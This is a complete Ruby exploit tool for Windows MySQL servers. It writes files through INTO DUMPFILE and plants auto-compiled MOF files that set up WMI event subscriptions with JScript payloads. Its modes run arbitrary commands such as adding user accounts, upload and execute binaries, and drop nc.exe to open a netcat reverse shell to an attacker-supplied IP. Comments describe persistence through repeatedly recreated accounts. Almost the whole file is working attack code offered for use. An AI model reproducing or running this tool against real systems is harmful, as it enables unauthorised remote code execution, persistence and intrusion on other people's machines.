#!/usr/bin/env ruby
#
# Windows MySQL MOF Exploit
# by: Hood3dRob1n
# 

require 'optparse'
require 'colorize'
require 'mysql'

# 31337 Banner
def banner
  puts
  puts "Windows MySQL MOF Exploit".light_green
  puts "By".light_green + ": Hood3dRob1n".white
end

# Clear Terminal
def cls
  system('clear')
end

# Generate a random aplha string length of value of num
def randz(num)
  (0...num).map{ ('a'..'z').to_a[rand(26)] }.join
end

# Execute commands in separate process
def fireNforget(command)
  pid = Process.fork
  if pid.nil?
    sleep(1)
    exec "#{command}" # This can now run in its own process thread and we dont have to wait for it
  else
    # In parent, detach the child process
    Process.detach(pid)
  end
end

# Check if Credentials work
# Return db object if success, nil otherwise
def can_we_connect?(host, user, pass, db=nil, port=3306)
  begin
    dbc = Mysql.connect(host, user, pass, db, port)
    return dbc
  rescue Mysql::Error => e
    puts "Connection Problem!"
    puts "\t=> #{e}"
    return nil
  end
end

# Pass DB Object
# Confirm Windows OS
# Return true or false
def is_windows?(dbc)
  q = dbc.query('SELECT @@version_compile_os;')
  q.each { |x| @os = x[0] }
  if @os =~ /Win|\.NET/
    return true
  else
    return false
  end
end

# Find Drive & Path in Use
def get_drive(dbc)
  q = dbc.query('SELECT @@tmpdir;')
  q.each { |x| @tmp=x[0]; }
  return @tmp[0]
end

# Simple .MOF Template to run our CMD after autocompiled
# Modded JSCRIPT MOF based on PHP Exploit I found on a server (unknown author)
def generate_cmd_mof(cmd)
  mof = "#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")
instance of __EventFilter as $EventFilter
{
EventNamespace = \"Root\\\\Cimv2\";
Name  = \"filtP2\";
Query = \"Select * From __InstanceModificationEvent \"
   \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \"
   \"And TargetInstance.Second = 5\";
QueryLanguage = \"WQL\";
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = \"consPCSV2\";
ScriptingEngine = \"JScript\";
ScriptText =
\"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"#{cmd}\\\")\";
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};";
  return mof
end

# Borrowed from MSF
# Simple .MOF Template
# Will run our EXE Payload when autocompiled
def generate_exe_mof(mofname, exe)
  mof = <<-EOT
#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
class MyClass@CLASS@
{
  	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
 	[key] string Name;
  	[not_null] string ScriptingEngine;
  	string ScriptFileName;
  	[template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"@EXE@\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass@CLASS@\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";

};
Instance of ActiveScriptEventConsumer as $cons2
{
  Name = "qndASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 = objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\#{mofname}\\");\\nf1.Delete(true);} catch(err) {};\\ntry {\\nvar f2 = objfs.GetFile(\\"@EXE@\\");\\nf2.Delete(true);\\nvar s = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass@CLASS@\\"";
  QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
  Name = "qndfilt";
  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\"Win32_Process\\" AND TargetInstance.Name = \\"@EXE@\\"";
  QueryLanguage = "WQL";

};
instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
  Consumer = $cons2;
  Filter = $Filt2;
};
instance of MyClass@CLASS@ as $MyClass
{
  Name = "ClassConsumer";
};
EOT
  classname = rand(0xffff).to_s
  mof.gsub!(/@CLASS@/, classname)
  mof.gsub!(/@EXE@/, exe)
  return mof
end

# Write MOF to File via INTO DUMPFILE
def write_mof_file(dbc, bin, dest)
  payload = bin.unpack("H*")[0]
  begin
    dbc.query("SELECT 0x#{payload} INTO DUMPFILE '#{dest}'")
    puts "Appears things were a success".light_green + "!".white
    return true
  rescue Mysql::Error => e
    puts "Problem writing payload to file".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    return false
  end
end

# Write Local Binary to File via INTO DUMPFILE
def write_bin_file(dbc, file, exe_dest)
  data = "0x" + File.open(file, 'rb').read.unpack('H*').first
  begin
    dbc.query("SELECT #{data} INTO DUMPFILE '#{exe_dest}'")
    puts "Appears things were a success".light_green + "!".white
    return true
  rescue Mysql::Error => e
    puts "Problem writing payload to file".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    if e =~ /MySQL server has gone away/
      puts "This is likely due to payload which is too large in size".light_red + ".....".white
      puts "Try compressing with UPX to shrink size down".light_red + ": upx 9 -qq #{file}".white
      puts "\t=> ".white + "Then try again".light_red + ".....".white
    end
    return false
  end
end

### MAIN ###
options = {}
optparse = OptionParser.new do |opts|
  opts.banner = "Usage:".light_green + "#{$0} ".white + "[".light_green + "OPTIONS".white + "]".light_green
  opts.separator ""
  opts.separator "EX:".light_green + " #{$0} -t 192.168..69.69 -u root -p root -C \"net user hr p@ssw0rd1 /add\"".white
  opts.separator "EX:".light_green + " #{$0} -t 192.168..69.69 -u root -p root -E /root/fun/payloads/fun.exe".white
  opts.separator "EX:".light_green + " #{$0} -t 192.168..69.69 -u root -p root -R -i 192.168.69.21 -P 4444".white
  opts.separator "EX:".light_green + " #{$0} -t 192.168..69.69 -u root -p root -U /usr/share/windows-binaries/nc.exe -d C:\\\\Temp\\\\".white
  opts.separator ""
  opts.separator "Options: ".light_green
  opts.on('-t', '--target IP', "\n\tTarget IP or IP Range".white) do |target|
    options[:target] = target.chomp
  end
  opts.on('-u', '--user USER', "\n\tMySQL User to Authenticate".white) do |user|
    options[:user] = user.chomp
  end
  opts.on('-p', '--pass PASS', "\n\tMySQL User Password".white) do |pass|
    options[:pass] = pass.chomp
  end
  opts.on('-U', '--upload EXE', "\n\tOnly Upload Binary".white) do |evilbin|
    if File.exists?(evilbin.chomp) and not File.directory?(evilbin.chomp)
      options[:method] = 0
      options[:payload] = evilbin.chomp
    else
      cls
      banner
      puts
      puts "Unable to load EXE payload".light_red + "!".white
      puts "Check path or permissions and try again".light_red + "....".white
      puts
      puts opts
      puts
      exit 69;
    end
  end
  opts.on('-d', '--dest PATH', "\n\tDestination Path for Upload option (i.e. \"C:\\\\TEMP\\\\\")".white) do |dest|
      options[:dest] = dest.chomp
  end
  opts.on('-C', '--cmd CMD', "\n\tRun Blind System Command as Payload \n\t  i.e.NET USER NOOB P@ssw0rd1 /ADD".white) do |cmd|
      options[:method] = 1
      options[:payload] = cmd.chomp
  end
  opts.on('-E', '--exe EXE', "\n\tUpload & Execute EXE".white) do |evilbin|
    if File.exists?(evilbin.chomp) and not File.directory?(evilbin.chomp)
      options[:method] = 2
      options[:payload] = evilbin.chomp
    else
      cls
      banner
      puts
      puts "Unable to load EXE payload".light_red + "!".white
      puts "Check path or permissions and try again".light_red + "....".white
      puts
      puts opts
      puts
      exit 69;
    end
  end
  opts.on('-R', '--reverse', "\n\tNetCat Reverse Command Shell".white) do |blah|
    evilbin = './payloads/nc.exe'
    if File.exists?(evilbin) and not File.directory?(evilbin)
      options[:method] = 3
      options[:payload] = evilbin
    else
      cls
      banner
      puts
      puts "Unable to find NetCat (nc.exe) payload".light_red + "!".white
      puts "It should have come with the script, so check path or permissions and try again".light_red + "....".white
      puts
      puts opts
      puts
      exit 69;
    end
  end
  opts.on('-i', '--ip IP', "\n\tIP for Reverse Shell Option".white) do |ip|
      options[:ip] = ip.chomp
  end
  opts.on('-P', '--port PORT', "\n\tPort for Reverse Shell Option".white) do |port|
      options[:port] = port.chomp.to_i
  end
  opts.on('-h', '--help', "\n\tHelp Menu".white) do 
    cls
    banner
    puts
    puts opts
    puts
    exit 69;
  end
end
begin
  foo = ARGV[0] || ARGV[0] = "-h"
  optparse.parse!
  if options[:method].to_i == 0
    mandatory = [:target, :user, :pass, :payload, :dest]
  elsif options[:method].to_i == 3
    mandatory = [:target, :user, :pass, :payload, :ip, :port]
  else
    mandatory = [:target, :user, :pass, :payload]
  end
  missing = mandatory.select{ |param| options[param].nil? }
  if not missing.empty?
    cls
    banner
    puts
    puts "Missing options".light_red + ": #{missing.join(', ')}".white
    puts optparse
    exit 666;
  end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
  cls
  banner
  puts
  puts $!.to_s
  puts
  puts optparse
  puts
  exit 666;   
end

### Main --
dbc = can_we_connect?(options[:target], options[:user], options[:pass], nil, 3306)
if not dbc.nil?
  # This only works on windows....
  if is_windows?(dbc)
    drive = get_drive(dbc) # Would it ever not be C?
    # Straight RCE vs UP & Exec
    case options[:method].to_i
    when 0
      # Upload User File
      exe_dest = "#{options[:dest]}"
      # Simply upload (binary) file, no more no less....
      puts "Uploading payload file '".light_blue + "#{options[:payload]}".white + "' to '".light_blue + "#{exe_dest}".white + "'".light_blue
      write_bin_file(dbc, options[:payload], exe_dest)
    when 1
      # Assign random name
      mof_name = randz(5) + ".mof"
      # We write to the System32\wbem\mof dir
      # Any .mof written here gets auto-compiled by mofcomp.exe
      # Use .MOF Template with JSCRIPT to run cmd via WScript.shell on compile
      # Apparenlty it doesnt auto-compile on newer windows (Vista+) which is why this is limited to XP & 2k3 Server
      # Remains unclear what happens if you pre-compile and place evil.mof there on newer versions.....idk?
      # As long as the MOF file remains in the /wbem/mof/good/ directory after auto-compile it will keep running it over & over
      # very fun if your CTF red teaming and adding user accounts or other persistent commands for fun, i.e. re-appearing user accounts :p
      mof_dest = "#{drive}:\\\\\\windows\\\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}"
      puts "Attempting to Execute Blind System Command via MOF Payload".light_blue + ".....".white
      puts "MOF".light_green + ": #{mof_dest}".white
      puts "CMD".light_green + ": #{options[:payload]}".white
      # Generate our .MOF file with embedded command
      mof = generate_cmd_mof(options[:payload])
      # Now write to file and make the magic happen :)
      write_mof_file(dbc, mof, mof_dest)
    when 2
      exe_name = randz(15) + ".exe"
      mof_name = randz(5) + ".mof"
      exe_dest = "#{drive}:\\\\windows\\\\system32\\\\#{exe_name}"
      mof_dest = "#{drive}:\\\\\\windows\\\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}"

      # Now we read our local binary payload into a var so we can re-write to remote server
      data = "0x" + File.open(options[:payload], 'rb').read.unpack('H*').first

      puts "Uploading payload file '".light_blue + "#{options[:payload]}".white + "' to '".light_blue + "#{exe_dest}".white + "'".light_blue
      puts "If you're expecting a shell".light_yellow + ",".white + " make sure your listener is ready".light_yellow + "......".white
      sleep(3)
      begin
        dbc.query("SELECT #{data} INTO DUMPFILE '#{exe_dest}'")
        puts "Appears things were a success".light_green + "!".white
      rescue Mysql::Error => e
        puts "Problem writing payload to file".light_red + "!".white
        puts "\t=> ".white + "#{e}".light_red
        if e =~ /MySQL server has gone away/
          puts "This is likely due to payload which is too large in size".light_red + ".....".white
          puts "Try compressing with UPX to shrink size down".light_red + ": upx 9 -qq #{options[:payload]}".white
          puts "\t=> ".white + "Then try again".light_red + ".....".white
        end
      end

      # Upload our MOF file which will run our payload we just dropped
      puts "Uploading MOF which will wait for our payload".light_blue + "....".white
      mof = generate_exe_mof(mof_name, exe_name)
      write_mof_file(dbc, mof, mof_dest)
    when 3
      # Upload nc.exe then use to get reverse shell
      mof_name = randz(5) + ".mof"
      exe_name = randz(15) + ".exe"
      exe_dest = "#{drive}:\\\\\\windows\\\\\\system32\\\\#{exe_name}"
      mof_dest = "#{drive}:\\\\\\windows\\\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}"
      revshell = "#{exe_name} #{options[:ip]} #{options[:port]} -e cmd.exe"
      listener = "xterm -title 'NetCat Listener' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'nc -lvp #{options[:port]}'\""

      puts "Uploading NetCat (nc.exe) file '".light_blue + "#{options[:payload]}".white + "' to '".light_blue + "#{exe_dest}".white + "'".light_blue
      # If we can upload nc.exe continue...
      if write_bin_file(dbc, options[:payload], exe_dest)
        # Spawn listener in new window...
        puts "Launching listener in new window".light_blue + ".....".white
        fireNforget(listener)
        sleep(1)

        puts "Triggering Reverse Shell to '".light_blue + "#{options[:ip]}".white + "' on port '".light_blue + "#{options[:port]}".white + "'".light_blue + ".....".white
        mof = generate_cmd_mof(revshell)
        write_mof_file(dbc, mof, mof_dest)
        puts "WARNING".light_red + ": ".white + "#{exe_dest} (NetCat) remains on system & suggested to remove".light_yellow + "....".white
      end
    else
      puts "This only works against Windows targets".light_red + "!".white
      puts "Find another target or find another way in".light_red + ".....".white
    end
  end
end
puts
puts
#EOF
